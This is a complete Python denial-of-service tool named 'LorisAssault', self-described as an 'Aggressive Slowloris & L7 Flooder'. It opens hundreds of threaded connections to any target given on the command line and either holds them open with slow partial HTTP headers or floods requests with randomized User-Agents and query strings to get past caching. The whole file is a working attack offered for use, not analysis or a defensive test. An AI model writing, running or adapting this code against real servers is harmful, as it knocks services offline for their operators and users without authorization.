import socket
import random
import time
import sys
import threading
import argparse
from concurrent.futures import ThreadPoolExecutor

# List of common User-Agents to randomize headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.172"
]

class LorisAssault:
    def __init__(self, target, port, connections, threads, flood=False):
        self.target = target
        self.port = port
        self.max_connections = connections
        self.threads = threads
        self.flood = flood
        self.sockets = []
        self.lock = threading.Lock()
        self.running = True

    def init_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.target, self.port))
            
            # Initial headers
            if self.flood:
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 5000)).encode("utf-8"))
            else:
                s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            
            s.send("User-Agent: {}\r\n".format(random.choice(USER_AGENTS)).encode("utf-8"))
            s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
            return s
        except socket.error:
            return None

    def worker(self):
        local_sockets = []
        conns_per_thread = self.max_connections // self.threads
        
        while self.running:
            # Maintain connection count
            while self.running and len(local_sockets) < conns_per_thread:
                s = self.init_socket()
                if s:
                    local_sockets.append(s)
                else:
                    time.sleep(1) # Slow down if target is refusing connections

            # Keep-alive headers (Slowloris logic)
            dead_sockets = []
            for s in local_sockets:
                try:
                    if self.flood:
                        # Full L7 flood mode: send more data
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                        s.send("Host: {}\r\n".format(self.target).encode("utf-8"))
                        s.send("Connection: keep-alive\r\n\r\n".encode("utf-8"))
                        # Re-open after full request in flood mode
                        dead_sockets.append(s)
                    else:
                        # Classic Slowloris: just keep it open
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    dead_sockets.append(s)

            for s in dead_sockets:
                try:
                    local_sockets.remove(s)
                    s.close()
                except:
                    pass
            
            # Slowloris interval vs Flood speed
            if not self.flood:
                time.sleep(15)
            else:
                time.sleep(0.1) # Fast flood

    def start(self):
        print(f"[*] Attacking {self.target}:{self.port} with {self.max_connections} connections across {self.threads} threads...")
        if self.flood:
            print("[!] Flood mode ENABLED - Heavy resource usage.")
            
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.worker)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Aggressive Slowloris & L7 Flooder")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-c", "--connections", type=int, default=1000, help="Total number of connections (default: 1000)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-f", "--flood", action="store_true", help="Enable L7 flooding (more aggressive)")
    
    args = parser.parse_args()

    assault = LorisAssault(args.target, args.port, args.connections, args.threads, args.flood)
    try:
        assault.start()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")
        assault.running = False
        sys.exit(0)
